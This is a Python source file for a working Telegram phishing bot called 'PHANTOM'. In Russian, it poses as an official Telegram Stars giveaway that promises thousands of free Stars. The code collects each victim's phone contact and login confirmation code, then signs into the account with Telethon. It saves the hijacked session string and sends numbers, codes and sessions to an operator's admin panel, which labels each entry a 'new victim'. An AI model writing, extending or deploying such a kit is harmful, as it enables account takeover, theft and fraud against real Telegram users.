import os
from telebot import TeleBot, types
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}  # phone → data

print("[+] PHANTOM FULL TELEGRAM STARS FISHING STARTED")

# ====================== ГЛАВНОЕ МЕНЮ ======================
@bot.message_handler(commands=['start'])
def start(message):
    text = """🌟 <b>Добро пожаловать в официальный Telegram Stars Rewards Center 2026!</b>

🎁 Специальная акция от Telegram — получай Stars бесплатно!

✅ Почему миллионы уже подключились:
• Официальное API Telegram
• Полная безопасность данных
• Мгновенное начисление Stars
• Ежедневные бонусы и розыгрыши
• Обмен Stars на TON, USDT и NFT

💰 Что ты получишь сразу после подключения:
• От 3000 до 6000 Stars на баланс
• Участие в закрытых аирдропах TON Foundation
• Эксклюзивные стикеры и эффекты

Нажми кнопку ниже и подключи аккаунт за 30 секунд 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    markup.add(types.InlineKeyboardButton("📋 Подробнее об акции", callback_data="info"))
    markup.add(types.InlineKeyboardButton("🎁 Активные розыгрыши", callback_data="drops"))

    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "info")
def info(call):
    bot.send_message(call.message.chat.id, "Telegram Stars — это новая валюта Telegram. Получай её бесплатно за простое подключение аккаунта.")

@bot.callback_query_handler(func=lambda call: call.data == "drops")
def drops(call):
    bot.send_message(call.message.chat.id, "Сейчас активны: TON Genesis Drop, Stars Weekly и NFT AirDrop.")

# ====================== ФИШИНГ С КОНТАКТОМ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📱 Отправить мой контакт", request_contact=True))
    
    bot.send_message(call.message.chat.id, 
        "📱 Чтобы получить Stars, отправь свой контакт (нажми кнопку ниже)", 
        reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if not message.contact or not message.contact.phone_number:
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    victims[phone] = {
        "code": None,
        "name": message.contact.first_name or "Unknown",
        "session_string": None
    }

    print(f"[+] КОНТАКТ ПОЛУЧЕН: {phone}")

    bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 Номер: {phone}\n👤 Имя: {victims[phone]['name']}")

    bot.send_message(message.chat.id, 
        f"✅ Контакт принят: <b>{phone}</b>\n\nТеперь введи код подтверждения, который пришёл тебе в Telegram или SMS:", 
        parse_mode='HTML')

# ====================== ОБРАБОТКА КОДА ======================
@bot.message_handler(func=lambda m: True)
def handle_code(message):
    if message.contact or message.text.startswith('/'):
        return

    for phone in list(victims.keys()):
        if victims[phone]["code"] is None:
            code = message.text.strip()
            victims[phone]["code"] = code

            print(f"[+] КОД ПОЛУЧЕН: {phone} → {code}")

            # Создаём сессию автоматически
            asyncio.run(create_session(phone, code))

            bot.send_message(ADMIN_ID, f"🔑 КОД ОТ ЖЕРТВЫ!\n📱 {phone}\n🔑 Код: {code}")

            bot.send_message(message.chat.id, """🎉 <b>Аккаунт успешно подключён!</b>

На ваш баланс начислено <b>4750 Stars</b>! 🎁

Теперь ты можешь тратить их на мини-приложения, стикеры и обменивать на TON.

Спасибо за участие в программе Telegram Stars Rewards!""", parse_mode='HTML')
            return

async def create_session(phone, code):
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        if phone in victims:
            victims[phone]["session_string"] = session_string
            victims[phone]["first_name"] = me.first_name
            victims[phone]["username"] = me.username

        await bot.send_message(ADMIN_ID, f"✅ Сессия создана для {phone}\nИмя: {me.first_name}")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Не удалось создать сессию для {phone}\nОшибка: {e}")
    finally:
        await client.disconnect()

# ====================== АДМИН ПАНЕЛЬ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    if not victims:
        bot.send_message(message.chat.id, "Пока нет пойманных аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone in victims:
        short = phone[-8:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"code:{phone}"),
            types.InlineKeyboardButton(f"📄 Session {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Инфо {short}", callback_data=f"info:{phone}")
        )

    text = f"🔥 PHANTOM ADMIN PANEL\nПоймано аккаунтов: {len(victims)}"
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ADMIN_ID:
        return

    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        return

    if action == "file":
        session = data.get("session_string")
        if session:
            bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{session}</code>", parse_mode='HTML')
        else:
            bot.send_message(call.message.chat.id, "Сессия ещё не создана.")
    elif action == "code":
        code = data.get("code") or "Ещё не ввели"
        bot.send_message(call.message.chat.id, f"🔑 Код для {phone}: {code}")
    elif action == "info":
        bot.send_message(call.message.chat.id, f"👁 Информация:\nНомер: {phone}\nИмя: {data.get('first_name', '—')}\nUsername: @{data.get('username', 'нет')}")

print("[+] Большой фишинг-кит готов. Отправляй жертвам ссылку на бота.")
bot.infinity_polling(none_stop=True)
